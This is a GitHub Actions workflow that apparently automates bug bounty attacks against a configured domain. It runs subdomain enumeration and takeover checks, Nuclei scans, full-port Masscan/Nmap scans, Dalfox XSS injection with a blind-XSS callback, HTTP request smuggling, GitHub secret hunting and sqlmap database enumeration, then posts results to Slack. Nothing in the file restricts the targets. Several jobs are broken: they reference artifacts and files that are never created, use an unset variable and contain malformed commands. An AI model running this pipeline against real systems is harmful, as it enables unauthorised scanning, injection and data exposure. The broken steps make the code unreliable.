#Important Note:
# Before running this action, make sure you updated following secrets variables in settings.
#  1. TARGET_DOMAIN
#       example.com
name: BB Public Program
on:
  workflow_dispatch:
env:
      TARGET: ${{ secrets.PUBLIC_DOMAIN }}
      HOST: ${{ secrets.NGROK_URL }}
      XSS_HUNTER_URL_TOKEN: ${{ secrets.XSS_HUNTER_BLIND_URL_TOKEN }}
      SLACK_OAUTH_TOKEN: ${{ secrets.SLACK_OAUTH_USER_TOKEN }}
      SLACK_CHANNEL_NAME: ${{ secrets.PUBLIC_SLACK_CHANNEL_NAME }}

jobs:

#Subdomain Enumeration on specified target.  
  subdomain-enumeration:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2             
      - name: Install Dependencies
        run: |
         wget --quiet $HOST/subdomains-exclude.txt
         sudo snap install amass
         wget --quiet https://raw.githubusercontent.com/ValluvarSploit/Resolver/main/resolvers.txt
         cd binaries
         chmod +x shuffledns assetfinder findomain subfinder
         cd ..
       #git clone https://github.com/blechschmidt/massdns.git ; cd massdns/ ; make ; sudo mv bin/massdns /usr/bin/massdns       
      - name: Amass
        run: amass enum -passive -d "$TARGET" >> subdomains-all.txt
      - name: Assetfinder
        run: ./binaries/assetfinder --subs-only "$TARGET" -silent >> subdomains-all.txt           
      - name: Findomain
        run: ./binaries/findomain -t "$TARGET" -q >> subdomains-all.txt    
      - name: Subfinder
        run: |
         ./binaries/subfinder -d "$TARGET" -all --silent >> subdomains-all.txt
         echo Total Discovered Subdomains: $(cat subdomains-all.txt | wc -l)
      - name: ShuffleDNS
        run: ./binaries/shuffledns -d "$TARGET" -w wordlists/subdomain-wordlists.txt -r resolvers.txt -v -o shuffledns-brute.txt 
      - name: Unique subdomains
        run: |
         cat shuffledns-brute.txt >> subdomains-all.txt
         cat subdomains-all.txt | sed 's/\*\.//g' | sort -u > subdomains-uniq.txt
         echo Total Uniq Subdomains: $(cat subdomains-uniq.txt | wc -l)
         grep -vFf subdomains-exclude.txt subdomains-uniq.txt > subdomains.txt
         echo Total Subdomains to do Recon: $(cat subdomains.txt | wc -l)       
      - name: HTTP/HTTPS Resolver
        run: |
         cat subdomains.txt | ./binaries/httpx -follow-redirects -status-code -vhost -threads 300 -silent | sort -u | grep "[200]" | cut -d [ -f1 | sort -u | sed 's/[[:blank:]]*$//' >> subdomains-resolved.txt
         echo Total Resolved Subdomains: $(cat subdomains-resolved.txt | wc -l)
      - name: Subdomain Enumeration Artifacts
        run: mkdir subdomain-enum-artifacts; cp subdomains-resolved.txt subdomains.txt subdomain-enum-artifacts/
      - name: Upload Subdomain Enumeration Artifacts
        uses: actions/upload-artifact@v2
        with:
         name: subdomain-enumeration-artifacts
         path: subdomain-enum-artifacts/
      
#Subdomain Takeover on specified targets.
  subdomain-takeover:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts
      - name: Install Dependencies
        run: |
         git clone https://github.com/projectdiscovery/nuclei-templates.git
         cd binaries; chmod +x subjack subzy nuclei; cd ..
      - name: Subzy
        run: |
         ./binaries/subzy --targets=subdomains-resolved.txt -concurrency 50 | tee subzy-logs.txt
         cat subzy-logs.txt | grep -v "NOT VULNERABLE" > subzy-output.txt
      - name: Subjack
        run: |
         ./binaries/subjack -w subdomains-resolved.txt -t 100 -timeout 30 -o subjack-logs.txt -v -c subjack_fingerprints.json
         cat subjack-logs.txt | grep -v "Not Vulnerable" | tee subjack-output.txt 
      - name: Nuclei
        run: ./binaries/nuclei -l subdomains-resolved.txt -c 100 -stats -t nuclei-templates/takeovers/subdomain-takeover.yaml -o nuclie-output.txt   
      - name: SubOver
        run: cd binaries; ./SubOver -l subdomains.txt -o subover.txt; cd ..
      - name: Combine Output Files
        run: |
         cat subzy-logs.txt subjack-logs.txt >> sto.log
         if [[ -f subzy-output.txt ]]; then echo "*****Subzy*****" > subdomain-takeovers.txt; cat subzy-output.txt >> subdomain-takeovers.txt; fi
         if [[ -f subjack-output.txt ]]; then echo "*****Subjack*****" >> subdomain-takeovers.txt; cat subjack-output.txt >> subdomain-takeovers.txt; fi
         if [[ -f nuclie-output.txt ]]; then echo "*****Nuceli*****" >> subdomain-takeovers.txt; cat nuclie-output.txt >> subdomain-takeovers.txt; fi
         if [[ -f subover.txt ]]; then echo "*****SubOver*****" >> subdomain-takeovers.txt; cat subover.txt >> subdomain-takeovers.txt; fi
      - name: Send Output to Slack
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-Subdomain-Takeover -F filename=subdomain-takeovers.txt -F file=@subdomain-takeovers.txt
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-Subdomain-Takeover-Logs -F filename=sto.log -F file=@sto.log
      
#Nuclei Template Scan.
  nuclei-scan:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts
      - name: Install Dependencies
        run: |
         git clone https://github.com/projectdiscovery/nuclei-templates.git
         chmod +x binaries/nuclei   
      - name: Nuclei scan
        run: |
         ./binaries/nuclei -l subdomains-resolved.txt -c 500 -stats -silent -t nuclei-templates/ -o nuclie-scan.txt
       #./binaries/nuclei -l subdomains-resolved.txt -c 500 -stats -silent -t nuclei-templates/ -exclude nuclei-templates/fuzzing/wp-plugin-scan.yaml -exclude nuclei-templates/fuzzing/basic-auth-bruteforce.yaml -exclude nuclei-templates/default-credentials/ -o nuclie-scan.txt        
      - name: Send Output Files Slack Channel
        run: if [[ -f nuclie-scan.txt ]]; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Nuclei-Template-Scan -F filename=nuclie-scan.txt -F file=@nuclie-scan.txt; fi

#Naabu Ports Scan
  naabu-ports-scan:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts
      - name: Install Dependencies
        run: chmod +x binaries/naabu
      - name: Naabu
        run: ./binaries/naabu iL subdomains.txt > naabu-portscan.txt
      - name: Send Output to Slack
        run: curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-Naabu-Portscan -F filename=naabu-portscan.txt -F file=@naabu-portscan.txt
         
#Broken Link Hijacking on specified targets.
  broken-link-hijacking:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts
      - name: Install Dependencies
        run: sudo npm install broken-link-checker -g
      - name: blh
        run: while read url ; do printf ***"$url"*** | tee -a blh-output.txt; blc -rof --filter-level 3 $url | tee -a blh-output.txt; done < httpx-subdomains-output.txt
      - name: Send Output to Slack
        run: curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Broken-Link-Hijacker-Results -F filename="$TARGET_DOMAIN"-blh.txt -F file=@blh-output.txt

#Collect URLs.
  url-collector:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install Dependencies
        run: |
         cd binaries; chmod +x waybackurls gau; cd ..
         go get -u github.com/tomnomnom/gf && cp /home/runner/go/bin/gf .
         git clone https://github.com/1ndianl33t/Gf-Patterns && mkdir ~/.gf && cp -r Gf-Patterns/*.json ~/.gf/
         cd ~/.gf/; wget https://raw.githubusercontent.com/devanshbatham/ParamSpider/master/gf_profiles/potential.json
        # wget --quiet https://github.com/tomnomnom/qsreplace/releases/download/v0.0.1/qsreplace-linux-386-0.0.1.tgz && tar xvf qsreplace-linux-386-0.0.1.tgz
        # go get github.com/tomnomnom/waybackurls && cp /home/runner/go/bin/waybackurls .
      - name: waybackurls
        run: ./binaries/waybackurls "$TARGET" > waybackurls.txt 
      - name: gau
        run: |
         ./binaries/gau "$TARGET" > gau.txt
         cat gau.txt | sort -u >> waybackurls.txt 
      - name: Upload BBP-Public Artifacts
        uses: actions/upload-artifact@v2
        with:
         name: bbp-public-artifacts-url-collector-uploaded
         path: waybackurls.txt
      - name: Patterns
        run: |
         mkdir bbp-public-artifacts-url-collector
         ./gf xss waybackurls.txt | cut -d : -f3- | sort -u > bbp-public-artifacts-url-collector/xss-params.txt
         ./gf ssti waybackurls.txt | sort -u > bbp-public-artifacts-url-collector/ssti-params.txt  
         ./gf ssrf waybackurls.txt | sort -u > bbp-public-artifacts-url-collector/ssrf-params.txt 
         ./gf sqli waybackurls.txt | sort -u > bbp-public-artifacts-url-collector/sqli-params.txt
         ./gf redirect waybackurls.txt | cut -d : -f3- | sort -u > bbp-public-artifacts-url-collector/redirect-params.txt
         ./gf rce waybackurls.txt | sort -u > bbp-public-artifacts-url-collector/rce-params.txt
         ./gf lfi waybackurls.txt | sort -u > bbp-public-artifacts-url-collector/lfi-params.txt
         ./gf potential waybackurls.txt | cut -d : -f3- | sort -u > bbp-public-artifacts-url-collector/potential-params.txt

#Parameter Discovery
  parameter-discovery:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Install Dependencies
        run: |
         git clone https://github.com/devanshbatham/ParamSpider
         cd ParamSpider
         pip3 install -r requirements.txt
         cd ..
      - name: ParamSpider
        run: |
         python3 ParamSpider/paramspider.py -d "$TARGET" -l high -o paramspider.txt --exclude woff,css,js,png,svg,php,jpg;
      - name: Upload BBP-Public Artifacts
        uses: actions/upload-artifact@v2
        with:
         name: paramspider-artifacts
         path: paramspider.txt
         
#XSS Automation
  xss-hunter:
    runs-on: ubuntu-latest
    needs: [parameter-discovery]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: paramspider-artifacts        
      - name: Install Dependencies
        run: sudo snap install dalfox       
      - name: Dalfox
        run: dalfox -b "$XSS_HUNTER_URL_TOKEN" file paramspider.txt > xss-vulnerable-urls.txt
      - name: Send Outputs to Slack
        run: |
         if [[ -f xss-vulnerable-urls.txt ]] ; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-XSS -F filename=xss-vulnerable-urls.txt -F file=@xss-vulnerable-urls.txt; fi
       #count=$(cat xss-vulnerable-urls.txt | wc -w)
       #if [[ -f xss-vulnerable-urls.txt ]] && [[ "$count" -gt 0 ]] ; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-XSS-Results -F filename="$TARGET_DOMAIN"-xss-poc-urls.txt -F file=@xss-vulnerable-urls.txt; fi

#Github Scanning
  github-scanning:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts       
      - name: Install Dependencies
        run: chmod +x binaries/git-hound   
      - name: Git-Hound
        run: cat subdomains-resolved.txt | git-hound --dig-files --dig-commits > githound.txt
      - name: Send Outputs to Slack
        run: if [[ -f githound.txt ]] ; then curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-GitHound -F filename=githound.txt -F file=@githound.txt; fi

#FavIcon Hash Extraction
  favicon-hash-extraction:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts       
      - name: Install Dependencies
        run: |
         git clone https://github.com/devanshbatham/FavFreak
         pip3 install -r FavFreak/requirements.txt
      - name: FavFreak
        run: |
         echo https://$TARGET | python3 FavFreak/favfreak.py > favers.txt
         cat favers.txt | grep 'h]' | cut -d ] -f2 | cut -d " " -f2 > favihash.txt
      - name: Send Outputs to Slack
        run: curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-FaviHash -F filename=favihash.txt -F file=@favihash.txt; fi

#Javascript Scan
  javascript-scan:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: subdomain-enumeration-artifacts       
      - name: Install Dependencies
        run: |
         cd binaries; chmod +x gau subjs hakrawler httpx; cd ..
         git clone https://github.com/GerbenJavado/LinkFinder.git
         cd LinkFinder; python3 setup.py install; pip3 install -r requirements.txt; cd ..
         wget https://raw.githubusercontent.com/m4ll0k/Bug-Bounty-Toolz/master/getjswords.py
         wget https://gist.githubusercontent.com/KathanP19/d2cda2f99c0b60d64b76ee6039b37e47/raw/eb105a4de06502b2732df9d682c61189c3703685/jsvar.sh
      - name: Javascript Scan
        run: |
         echo "$TARGET" | ./binaries/gau | grep -iE "\.js$" | sort -u > js-file-links.txt
         echo "$TARGET" | ./binaries/subjs >> js-file-links.txt
         echo "$TARGET" | ./binaries/hakrawler -js -depth 2 -scope subs -plain >> js-file-links.txt
         cat js-file-links.txt | ./binaries/httpx -follow-redirects -silent -status-code | grep "[200]" | cut -d ' ' -f1 | sort -u > js-file-links-live.txt;
         python3 LinkFinder/linkfinder.py -d -i "$TARGET" -o cli >> js-endpoints.txt
         cat js-file-links-live.txt | python3 getjswords.py | sort -u > js-words.txt;
         cat js-file-links-live.txt | while read url ; do bash jsvar.sh $url | sort -u | tee js-xss.txt ; done;
      - name: Send Outputs to Slack
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-JS-Files-URL -F filename=js-file-links-live.txt -F file=@js-file-links-live.txt;
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-JS-Endpoints -F filename=js-endpoints.txt -F file=@js-endpoints.txt;
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-JS-Files-Words -F filename=js-words.txt -F file=@js-words.txt;
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET"-JS-XSS -F filename=js-xss.txt -F file=@js-xss.txt;

#Hunt HTTP Smuggling Vulnerability on specified urls.
  http-smuggler:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]
                                
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN" 
         cat httpx-subdomains-output.txt | head

      - name: Install Dependencies
        run: |
         git clone https://github.com/defparam/smuggler.git
          
      - name: Smuggler
        run: |
         cat httpx-subdomains-output.txt | python3 smuggler/smuggler.py --log http-smuggler.txt
                 
      - name: Send Files to Slack Channel
        run: |
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-HTTP-Smuggler-Results -F filename="$TARGET_DOMAIN"-http-smuggler.txt -F file=@http-smuggler.txt

#Scan all ports on specified targets and run nmap on masscan results. 
  masscan-nmap:
    runs-on: ubuntu-latest
    needs: [subdomain-enumeration]             
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-uploaded

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN" 
         cat live-ips-output.txt | head

      - name: Install Dependencies
        run: |
         sudo apt-get update && sudo apt-get install nmap -y
         pip install python-libnmap
         sudo apt-get install git gcc make libpcap-dev
         git clone https://github.com/robertdavidgraham/masscan && cd masscan && make -j && cp bin/masscan ../masscanb
           
      - name: Masscan
        run: | 
         sudo ./masscanb -iL live-ips-output.txt --rate 10000 -p1-65535 -oX masscan.xml
                 
      - name: Masscan to Nmap
        run: |
         python masscan_to_nmap.py masscan.xml | tee -a nmap-masscan.txt
                 
      - name: Send File to Slack Channel            
        run: |           
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-Nmap-Masscan-Results -F filename="$TARGET_DOMAIN"-nmap-masscan.txt -F file=@nmap-masscan.txt


  sql-injection:
    runs-on: ubuntu-latest   
    needs: [url-collector]            
    
    steps:
      - uses: actions/checkout@v2
      - uses: actions/download-artifact@v2
        with:
         name: bbp-public-artifacts-url-collector

      - name: Targets
        run: |
         echo "TARGET IS:" "$TARGET_DOMAIN"
         cat sqli-params.txt | head    
        

      - name: Install Dependencies
        run: |
         git clone https://github.com/sqlmapproject/sqlmap.git
           
      - name: sqlmap
        run: | 
         mkdir sqlmap-output
         python3 sqlmap/sqlmap.py -m sqli-params.txt --batch --banner --dbs --output-dir sqlmap-output
         zip -r sqlmap-output.zip sqlmap-output
                                  
      - name: Send Files to Slack Channel            
        run: |           
         curl https://slack.com/api/files.upload -F token="$SLACK_OAUTH_TOKEN" -F channels="$SLACK_CHANNEL_NAME" -F title="$TARGET_DOMAIN"-sqlmap-Results -F filename="$TARGET_DOMAIN"-sqlmap-output.zip -F file=@sqlmap-output.zip
